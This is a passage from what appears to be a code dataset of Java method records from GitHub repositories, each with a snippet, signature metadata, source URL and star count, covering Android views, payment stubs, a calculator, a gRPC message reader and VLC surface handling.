ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.GET_FONT_METRICS_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "custo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal custo() {\t\treturn new BigDecimal(2);\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/processadores/GatewayRede.java", "stars": "9", "class": {"name": "GatewayRede", "extends": null, "implements": ["Pagador"], "modifiers": ["public"]}}, {"method_name": "paga", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<Transacao>", "snippet": "\tpublic CompletableFuture<Transacao> paga() {\t\tautorizadorDeTransacoes.autoriza(80, false);\t\tSystem.out.println(\"[Rede] \"+tentativaPagamento);\t\treturn CompletableFuture.completedFuture(new Transacao());\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/processadores/GatewayRede.java", "stars": "9", "class": {"name": "GatewayRede", "extends": null, "implements": ["Pagador"], "modifiers": ["public"]}}, {"method_name": "distribuerMasques", "params": ["DistributionMasqueUI", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String distribuerMasques(@ModelAttribute DistributionMasqueUI distributionMasqueUI,                                    @CookieValue(value = NOM_COOKIE_CODE_POSTAL_REMETTANT, defaultValue = \"\") String codePostal,                                    @CookieValue(value = NOM_COOKIE_TYPE_REMETTANT, defaultValue = \"\") String typeRemettant) {        if (StringUtils.isBlank(codePostal) || StringUtils.isBlank(typeRemettant)) {            return \"redirect:/\";        }        distribuerMasques.distribuer(distributionMasqueUIMapper.toDistributionMasques(distributionMasqueUI, codePostal, typeRemettant));        return \"confirmation-distribution-masques\";    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/application/ui/DistributionMasquesController.java", "stars": "5", "class": {"name": "DistributionMasquesController", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSon", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stm", "snippet": "\tpublic Stm getSon() {\t\treturn son;\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmUnary.java", "stars": "3", "class": {"name": "StmUnary", "extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "indent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void indent() {\t\tif (son != null) {\t\t\tson.setIndent(this.getIndent());\t\t\tson.indent();\t\t}\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmUnary.java", "stars": "3", "class": {"name": "StmUnary", "extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "calculator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "    public Double calculator() {        switch (operator) {            case \"+\":                result = first + second;                break;            case \"-\":                result = first - second;                break;            case \"*\":                result = first * second;                break;            case \"/\":                result = first / second;                break;            default:                result = 0.0;        }        return result;    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework03/src/com/fehead/beans/SimpleCalculator.java", "stars": "4", "class": {"name": "SimpleCalculator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getFirst", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "    public Double getFirst() {        return first;    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework03/src/com/fehead/beans/SimpleCalculator.java", "stars": "4", "class": {"name": "SimpleCalculator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setFirst", "params": ["Double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFirst(Double first) {        this.first = first;    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework03/src/com/fehead/beans/SimpleCalculator.java", "stars": "4", "class": {"name": "SimpleCalculator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSecond", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "    public Double getSecond() {        return second;    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework03/src/com/fehead/beans/SimpleCalculator.java", "stars": "4", "class": {"name": "SimpleCalculator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSecond", "params": ["Double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSecond(Double second) {        this.second = second;    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework03/src/com/fehead/beans/SimpleCalculator.java", "stars": "4", "class": {"name": "SimpleCalculator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOperator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOperator() {        return operator;    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework03/src/com/fehead/beans/SimpleCalculator.java", "stars": "4", "class": {"name": "SimpleCalculator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setOperator", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOperator(String operator) {        this.operator = operator;    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework03/src/com/fehead/beans/SimpleCalculator.java", "stars": "4", "class": {"name": "SimpleCalculator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getResult", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "    public Double getResult() {        return result;    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework03/src/com/fehead/beans/SimpleCalculator.java", "stars": "4", "class": {"name": "SimpleCalculator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setResult", "params": ["Double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setResult(Double result) {        this.result = result;    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework03/src/com/fehead/beans/SimpleCalculator.java", "stars": "4", "class": {"name": "SimpleCalculator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "forFile", "params": ["Path", "Descriptor", "TypeRegistry", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "MessageReader", "snippet": "    public static MessageReader forFile(Path path, Descriptor descriptor, TypeRegistry registry, String jsonData) {        if (!Strings.isNullOrEmpty(jsonData))            return new MessageReader(                    JsonFormat.parser().usingTypeRegistry(registry),                    descriptor,                    jsonData);        try {            return new MessageReader(                    JsonFormat.parser().usingTypeRegistry(registry),                    descriptor,                    Files.newBufferedReader(path),                    path.toString(),                    jsonData);        } catch (IOException e) {            throw new IllegalArgumentException(\"Unable to read file: \" + path.toString(), e);        }    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/io/MessageReader.java", "stars": "3", "class": {"name": "MessageReader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "readWithFile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ImmutableList<DynamicMessage>", "snippet": "    public ImmutableList<DynamicMessage> readWithFile() {        if (Objects.isNull(bufferedReader))            throw new IllegalArgumentException(\"BufferedReader is null because using json data\");        ImmutableList.Builder<DynamicMessage> resultBuilder = ImmutableList.builder();        try {            String line;            boolean wasLastLineEmpty = false;            while (true) {                line = bufferedReader.readLine();                // Two consecutive empty lines mark the end of the stream.                if (Strings.isNullOrEmpty(line)) {                    if (wasLastLineEmpty) {                        return resultBuilder.build();                    }                    wasLastLineEmpty = true;                    continue;                } else {                    wasLastLineEmpty = false;                }                // Read the next full message.                StringBuilder stringBuilder = new StringBuilder();                while (!Strings.isNullOrEmpty(line)) {                    stringBuilder.append(line);                    line = bufferedReader.readLine();                }                wasLastLineEmpty = true;                DynamicMessage.Builder nextMessage = DynamicMessage.newBuilder(descriptor);                jsonParser.merge(stringBuilder.toString(), nextMessage);                // Clean up and prepare for next message.                resultBuilder.add(nextMessage.build());            }        } catch (Exception e) {            throw new IllegalArgumentException(\"Unable to read messages from: \" + source, e);        }    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/io/MessageReader.java", "stars": "3", "class": {"name": "MessageReader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "readWithJsonData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ImmutableList<DynamicMessage>", "snippet": "    public ImmutableList<DynamicMessage> readWithJsonData() {        ImmutableList.Builder<DynamicMessage> resultBuilder = ImmutableList.builder();        try {            DynamicMessage.Builder nextMessage = DynamicMessage.newBuilder(descriptor);            jsonParser.merge(jsonData, nextMessage);            // Clean up and prepare for next message.            resultBuilder.add(nextMessage.build());            return resultBuilder.build();        } catch (Exception e) {            throw new IllegalArgumentException(\"Unable to read messages from: \" + jsonData, e);        }    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/io/MessageReader.java", "stars": "3", "class": {"name": "MessageReader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "read", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ImmutableList<DynamicMessage>", "snippet": "    public ImmutableList<DynamicMessage> read() {        if (!Strings.isNullOrEmpty(jsonData))            return readWithJsonData();        return readWithFile();    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/io/MessageReader.java", "stars": "3", "class": {"name": "MessageReader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSon", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Expr", "snippet": "\tpublic Expr getSon() {\t\treturn son;\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprUnary.java", "stars": "3", "class": {"name": "ExprUnary", "extends": "Expr", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "inicializar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void inicializar() {\t\tusuario = new Usuario();\t\tusuarioDao = new UsuarioDao();              }", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroUsuarioBean.java", "stars": "1", "class": {"name": "CadastroUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "salvar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void salvar() {\t\tlimpar();\t\t\t\tusuarioDao.salvar(usuario);\t\tFacesUtil.addInfoMessage(\"Usuario salvo com sucesso\");\t\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroUsuarioBean.java", "stars": "1", "class": {"name": "CadastroUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUsuario", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Usuario", "snippet": "\tpublic Usuario getUsuario() {\t\treturn usuario;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroUsuarioBean.java", "stars": "1", "class": {"name": "CadastroUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUsuario", "params": ["Usuario"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUsuario(Usuario usuario) {\t\tthis.usuario = usuario;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroUsuarioBean.java", "stars": "1", "class": {"name": "CadastroUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUsuarioDao", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UsuarioDao", "snippet": "\tpublic UsuarioDao getUsuarioDao() {\t\treturn usuarioDao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroUsuarioBean.java", "stars": "1", "class": {"name": "CadastroUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUsuarioDao", "params": ["UsuarioDao"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUsuarioDao(UsuarioDao usuarioDao) {\t\tthis.usuarioDao = usuarioDao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroUsuarioBean.java", "stars": "1", "class": {"name": "CadastroUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUsuarios", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Usuario>", "snippet": "\tpublic List<Usuario> getUsuarios() {\t\treturn usuarios;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroUsuarioBean.java", "stars": "1", "class": {"name": "CadastroUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUsuarios", "params": ["List<Usuario>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUsuarios(List<Usuario> usuarios) {\t\tthis.usuarios = usuarios;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroUsuarioBean.java", "stars": "1", "class": {"name": "CadastroUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "limpar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void limpar() {\t\tusuario = new Usuario();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroUsuarioBean.java", "stars": "1", "class": {"name": "CadastroUsuarioBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUp() throws Exception {\t\tmActivity = new Activity();\t\t// Make and set view with some prelim values to test\t\tmView = new TestImageView(mActivity);\t\tmView.setLayoutParams(new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));\t\tmView.measure(View.MeasureSpec.makeMeasureSpec(250, View.MeasureSpec.EXACTLY), View.MeasureSpec.makeMeasureSpec(250, View.MeasureSpec.EXACTLY));\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/test/com/nostra13/universalimageloader/core/assist/ImageSizeTest.java", "stars": "74", "class": {"name": "ImageSizeTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testGetImageSizeScaleTo_useImageActualSize", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testGetImageSizeScaleTo_useImageActualSize() throws Exception {\t\t// We layout the view to give it a width and height\t\tmView.measure(View.MeasureSpec.makeMeasureSpec(200, View.MeasureSpec.EXACTLY), View.MeasureSpec.makeMeasureSpec(200, View.MeasureSpec.EXACTLY));\t\tmView.layout(0, 0, 200, 200);\t\tImageSize expected = new ImageSize(200, 200);\t\tImageSize result = ImageSizeUtils.defineTargetSizeForView(mView, 590, 590);\t\tAssertions.assertThat(result).isNotNull();\t\tAssertions.assertThat(result.getWidth()).isEqualTo(expected.getWidth());\t\tAssertions.assertThat(result.getHeight()).isEqualTo(expected.getHeight());\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/test/com/nostra13/universalimageloader/core/assist/ImageSizeTest.java", "stars": "74", "class": {"name": "ImageSizeTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testGetImageSizeScaleTo_dontUseImageActualSizeWithWrapContent", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testGetImageSizeScaleTo_dontUseImageActualSizeWithWrapContent() throws Exception {\t\t//Set it to wrap content so that it will fall back to\t\tmView.setLayoutParams(new FrameLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT));\t\tmView.measure(View.MeasureSpec.makeMeasureSpec(250, View.MeasureSpec.EXACTLY), View.MeasureSpec.makeMeasureSpec(250, View.MeasureSpec.EXACTLY));\t\t// We layout the view to give it a width and height\t\tmView.layout(0, 0, 200, 200);\t\tImageSize expected = new ImageSize(500, 500);\t\tImageSize result = ImageSizeUtils.defineTargetSizeForView(mView, 500, 500);\t\tAssertions.assertThat(result).isNotNull().isEqualsToByComparingFields(expected);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/test/com/nostra13/universalimageloader/core/assist/ImageSizeTest.java", "stars": "74", "class": {"name": "ImageSizeTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testGetImageSizeScaleTo_useImageLayoutParams", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testGetImageSizeScaleTo_useImageLayoutParams() throws Exception {\t\t// Set a defined width\t\tmView.setLayoutParams(new FrameLayout.LayoutParams(300, 300));\t\tImageSize expected = new ImageSize(300, 300);\t\tImageSize result = ImageSizeUtils.defineTargetSizeForView(mView, 500, 500);\t\tAssertions.assertThat(result).isNotNull().isEqualsToByComparingFields(expected);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/test/com/nostra13/universalimageloader/core/assist/ImageSizeTest.java", "stars": "74", "class": {"name": "ImageSizeTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testGetImageSizeScaleTo_useImageCacheMaxSize", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testGetImageSizeScaleTo_useImageCacheMaxSize() throws Exception {\t\tImageSize expected = new ImageSize(500, 500);\t\tImageSize result = ImageSizeUtils.defineTargetSizeForView(mView, 500, 500);\t\tAssertions.assertThat(result).isNotNull().isEqualsToByComparingFields(expected);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/test/com/nostra13/universalimageloader/core/assist/ImageSizeTest.java", "stars": "74", "class": {"name": "ImageSizeTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testGetImageSizeScaleTo_useDisplayMetrics", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testGetImageSizeScaleTo_useDisplayMetrics() throws Exception {\t\t//The default Robolectic disp metrics are 480x800 normal hdpi device basically\t\tImageSize expected = new ImageSize(480, 800);\t\tImageSize result = ImageSizeUtils.defineTargetSizeForView(mView, 0, 0);\t\tAssertions.assertThat(result).isNotNull().isEqualsToByComparingFields(expected);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/test/com/nostra13/universalimageloader/core/assist/ImageSizeTest.java", "stars": "74", "class": {"name": "ImageSizeTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void onLayout(boolean changed, int left, int top, int right, int bottom) {\t\t\tsuper.onLayout(changed, left, top, right, bottom);\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/test/com/nostra13/universalimageloader/core/assist/ImageSizeTest.java", "stars": "74", "class": {"name": "TestImageView", "extends": "ImageView", "implements": null, "modifiers": ["private"]}}, {"method_name": "onMessage", "params": ["Message", "byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onMessage(Message message, byte[] pattern) {        //  \u83b7\u53d6\u5931\u6548\u7684key        String expiredKey = message.toString();        if(!expiredKey.startsWith(VideoManagerConstants.KEEPLIVEKEY_PREFIX)){        \tSystem.out.println(\"\u6536\u5230redis\u8fc7\u671f\u76d1\u542c\uff0c\u4f46\u5f00\u5934\u4e0d\u662f\"+VideoManagerConstants.KEEPLIVEKEY_PREFIX+\"\uff0c\u5ffd\u7565\");        \treturn;        }                String deviceId = expiredKey.substring(VideoManagerConstants.KEEPLIVEKEY_PREFIX.length(),expiredKey.length());        publisher.outlineEventPublish(deviceId, VideoManagerConstants.EVENT_OUTLINE_TIMEOUT);    }", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/event/outline/KeepliveTimeoutListener.java", "stars": "29", "class": {"name": "KeepliveTimeoutListener", "extends": "KeyExpirationEventMessageListener", "implements": null, "modifiers": ["public"]}}, {"method_name": "needInit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean needInit() {        return this.doInit == 1;    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/biz/InitializeBiz.java", "stars": "7", "class": {"name": "InitializeBiz", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "initialize", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BaseResponse", "snippet": "    public BaseResponse initialize() {        BaseResponse response = new BaseResponse();        if (!needInit()) {            response.setCode(ResponseCode.Fail);            return response;        }        this.initDir = FileUtil.reviseDir(this.initDir);        this.initConfigFile = FileUtil.reviseDir(this.initConfigFile);        try {            InitConfigEntity configEntity = initConfigService.parseConfigFile(this.initConfigFile);            if (configEntity == null) {                response.setCode(ResponseCode.Fail);                // response.setMsg(\"\u89e3\u6790\u521d\u59cb\u5316\u914d\u7f6e\u6587\u4ef6\u5931\u8d25\");                response.setMsg(\"Failed to parse the initialization configuration file\");                return response;            }            if (!initConfigService.isCorrectConfig(configEntity)) {                // log.error(\"\u914d\u7f6e\u6587\u4ef6\u4e2d\u76f8\u5173\u914d\u7f6e\u9879\u51fa\u9519\u6216\u4e3a\u7a7a\");                log.error(\"The configuration file is not valid and the value cannot be null\");                response.setCode(ResponseCode.Fail);                // response.setMsg(\"\u914d\u7f6e\u6587\u4ef6\u4e2d\u76f8\u5173\u914d\u7f6e\u9879\u51fa\u9519\u6216\u4e3a\u7a7a\");                response.setMsg(\"The configuration file is not valid and the value cannot be null\");                return response;            }            configFileGen.createConfigFile(configEntity);        } catch (FileNotFoundException fe) {            // log.error(\"\u6587\u4ef6\u4e0d\u5b58\u5728\u5f02\u5e38\", fe);            log.error(\"File Not Exist Exception\", fe);            response.setCode(ResponseCode.Fail);            fe.printStackTrace();        } catch (Exception e) {            // log.error(\"\u521d\u59cb\u5316\u53d1\u751f\u5f02\u5e38\", e);            log.error(\"Exception occurred during initialization\", e);            response.setCode(ResponseCode.Fail);            e.printStackTrace();        }        return response;    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/biz/InitializeBiz.java", "stars": "7", "class": {"name": "InitializeBiz", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setView", "params": ["int", "SurfaceView"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setView(int id, SurfaceView view) {        if (mSurfacesState.get() != SURFACE_STATE_INIT)            throw new IllegalStateException(\"Can't set view when already attached\");        if (view == null)            throw new NullPointerException(\"view is null\");        final SurfaceHelper surfaceHelper = mSurfaceHelpers[id];        if (surfaceHelper != null)            surfaceHelper.release();        mSurfaceHelpers[id] = new SurfaceHelper(id, view);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setView", "params": ["int", "TextureView"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setView(int id, TextureView view) {        if (!AndroidUtil.isICSOrLater())            throw new IllegalArgumentException(\"TextureView not implemented in this android version\");        if (mSurfacesState.get() != SURFACE_STATE_INIT)            throw new IllegalStateException(\"Can't set view when already attached\");        if (view == null)            throw new NullPointerException(\"view is null\");        final SurfaceHelper surfaceHelper = mSurfaceHelpers[id];        if (surfaceHelper != null)            surfaceHelper.release();        mSurfaceHelpers[id] = new SurfaceHelper(id, view);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setSurface", "params": ["int", "Surface", "SurfaceHolder"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setSurface(int id, Surface surface, SurfaceHolder surfaceHolder) {        if (mSurfacesState.get() != SURFACE_STATE_INIT)            throw new IllegalStateException(\"Can't set surface when already attached\");        if (!surface.isValid() || surfaceHolder == null)            throw new IllegalStateException(\"surface is not attached and holder is null\");        final SurfaceHelper surfaceHelper = mSurfaceHelpers[id];        if (surfaceHelper != null)            surfaceHelper.release();        mSurfaceHelpers[id] = new SurfaceHelper(id, surface, surfaceHolder);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setVideoView", "params": ["SurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVideoView(SurfaceView videoSurfaceView) {        setView(ID_VIDEO, videoSurfaceView);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setVideoView", "params": ["TextureView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVideoView(TextureView videoTextureView) {        setView(ID_VIDEO, videoTextureView);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setVideoSurface", "params": ["Surface", "SurfaceHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVideoSurface(Surface videoSurface, SurfaceHolder surfaceHolder) {        setSurface(ID_VIDEO, videoSurface, surfaceHolder);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setVideoSurface", "params": ["SurfaceTexture"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVideoSurface(SurfaceTexture videoSurfaceTexture) {        setSurface(ID_VIDEO, new Surface(videoSurfaceTexture), null);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setSubtitlesView", "params": ["SurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSubtitlesView(SurfaceView subtitlesSurfaceView) {        setView(ID_SUBTITLES, subtitlesSurfaceView);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setSubtitlesView", "params": ["TextureView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSubtitlesView(TextureView subtitlesTextureView) {        setView(ID_SUBTITLES, subtitlesTextureView);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setSubtitlesSurface", "params": ["Surface", "SurfaceHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSubtitlesSurface(Surface subtitlesSurface, SurfaceHolder surfaceHolder) {        setSurface(ID_SUBTITLES, subtitlesSurface, surfaceHolder);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/AWindow.java", "stars": "4", "class": {"name": "AWindow", "extends": null, "implements": ["IAWindowNativeHandler", "IVLCVout"], "modifiers": []}}, {"method_name": "setSubtitlesSurface", "params": ["SurfaceTexture"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void 